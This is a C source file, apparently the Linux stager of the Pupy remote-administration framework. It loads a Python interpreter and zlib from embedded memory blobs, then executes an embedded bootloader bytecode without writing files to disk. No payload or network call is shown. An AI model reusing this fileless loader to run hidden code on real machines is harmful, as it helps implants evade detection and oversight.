/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <stdlib.h>
#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include "pupy_load.h"
#include "Python-dynload.h"

#include "_memimporter.h"
#include "debug.h"

extern const char resources_python27_so_start[];
extern const int resources_python27_so_size;
extern const char resources_bootloader_pyc_start[];
extern const int resources_bootloader_pyc_size;
extern const char resources_zlib_so_start[];
extern const int resources_zlib_so_size;

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

// Simple trick to get the current pupy arch
#ifdef __x86_64__
	const uint32_t dwPupyArch = 64;
#else
	const uint32_t dwPupyArch = 32;
#endif


uint32_t mainThread(int argc, char *argv[]) {

	int rc = 0;
	PyObject *m=NULL, *d=NULL, *seq=NULL;
	PyObject *mod;
	char * ppath;
	FILE * f;
	uintptr_t cookie = 0;
	PyGILState_STATE restore_state;

	if(!Py_IsInitialized) {
		int res=0;
		if(dlsym(NULL, "Py_GetVersion")){
			dprint("libpython2.7.so is already loaded\n");
			_load_python_FromFile("libpython2.7.so"); // does not actually load a new python, but uses the handle of the already loaded one
		} else {
			if(!_load_python("libpython2.7.so", resources_python27_so_start, resources_python27_so_size)) {
				dprint("loading libpython2.7.so from memory failed\n");
				abort();
			}
			dprint("python interpreter loaded\n");
		}
	}
	dprint("calling PyEval_InitThreads() ...\n");
	PyEval_InitThreads();
	dprint("PyEval_InitThreads() called\n");

	if(!Py_IsInitialized()) {
		dprint("Py_IsInitialized!\n");

		ppath = Py_GetPath();
		dprint("PPATH: %s\n", ppath);
		strcpy(ppath, "\x00");

		Py_IgnoreEnvironmentFlag = 1;
		Py_NoSiteFlag = 1; /* remove site.py auto import */
		Py_Initialize();

		dprint("Py_Initialize()\n");
		PySys_SetObject("frozen", PyBool_FromLong(1));
	}
	restore_state=PyGILState_Ensure();

	init_memimporter();
	dprint("init_memimporter()\n");
	initpupy();
	dprint("initpupy()\n");

	dprint("load zlib\n");
    if (!import_module("initzlib", "zlib", resources_zlib_so_start, resources_zlib_so_size)) {
        dprint("ZLib load failed.\n");
    }

	/* We execute then in the context of '__main__' */
	dprint("starting evaluating python code ...\n");
	m = PyImport_AddModule("__main__");
	if (m) d = PyModule_GetDict(m);
	if (d) seq = PyMarshal_ReadObjectFromString(
		resources_bootloader_pyc_start,
		resources_bootloader_pyc_size
	);

	PySys_SetArgvEx(argc, argv, 0);

	if (seq) {
		Py_ssize_t i, max = PySequence_Length(seq);
		for (i=0;i<max;i++) {
			dprint("LOAD SEQUENCE %d\n", i);
			PyObject *sub = PySequence_GetItem(seq, i);
			if (seq) {
				PyObject *discard = PyEval_EvalCode((PyCodeObject *)sub, d, d);
				if (!discard) {
					dprint("discard\n");
					PyErr_Print();
					rc = 255;
				}
				Py_XDECREF(discard);
				/* keep going even if we fail */
			}
			Py_XDECREF(sub);
		}
	}
	dprint("complete ...\n");
	PyGILState_Release(restore_state);
	Py_Finalize();
	dprint("exit ...\n");
	return 0;
}
